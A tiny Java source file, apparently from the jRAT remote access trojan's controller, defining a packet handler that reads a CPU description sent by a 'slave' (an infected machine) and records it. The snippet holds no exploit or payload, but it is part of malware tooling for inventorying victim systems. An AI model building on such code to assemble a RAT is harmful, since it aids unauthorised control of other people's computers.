package jrat.controller.packets.incoming;

import jrat.controller.Slave;

public class Packet19InitCPU implements IncomingPacket {

	@Override
	public void read(Slave slave) throws Exception {
		String cpu = slave.readLine();
		slave.setCPU(cpu);
	}

}
